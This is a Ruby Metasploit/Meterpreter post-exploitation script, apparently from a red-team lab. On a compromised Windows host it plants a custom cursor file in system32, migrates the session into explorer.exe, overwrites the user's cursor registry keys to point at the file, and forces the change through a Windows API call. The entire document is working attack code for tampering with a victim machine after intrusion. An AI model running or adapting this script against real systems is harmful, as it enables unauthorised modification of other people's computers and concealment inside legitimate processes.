@client = client
key = "HKEY_CURRENT_USER"
ip = "192.168.56.128"
key_path = "#{key}\\Control\ Panel\\Cursors"

upload_cur_dir = "C:\\Windows\\system32"
cur_file = "/root/red/files/Kukfa_Dave.cur"
cur_upload_name = "cursor.cur"

def write_script_to_target(target_dir, filename, uploadname)
  if target_dir
    tempdir = target_dir
  end
  fileup = File.open("#{filename}", "r")
  data = fileup.read
  fileup.close
  tempvbs = tempdir + "\\" + "#{uploadname}"
  fd = @client.fs.file.new(tempvbs, "wb")
  fd.write(data)
  fd.close
  print_good("Persistent Script written to #{tempvbs}")
  # Escape windows pathname separators.
  return tempvbs
end

write_script_to_target(upload_cur_dir, cur_file, cur_upload_name)
#/usr/share/metasploit-framework/lib/msf/core/post/windows/registry.rb
test = registry_enumvals("#{key}")
pids = 1000
processes = client.sys.process.get_processes
processes.each do |proc|
	pids = proc['pid'] if proc['name'] == "explorer.exe"
end
session.core.migrate(pids)
print_good("MIGRATED")
registry_setvaldata("#{key_path}", "Arrow", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
registry_setvaldata("#{key_path}", "Hand", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
registry_setvaldata("#{key_path}", "Help", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
registry_setvaldata("#{key_path}", "Wait", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
registry_setvaldata("#{key_path}", "AppStarting", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
client.railgun.user32.SystemParametersInfoA(0x57, 0, nil, 0)
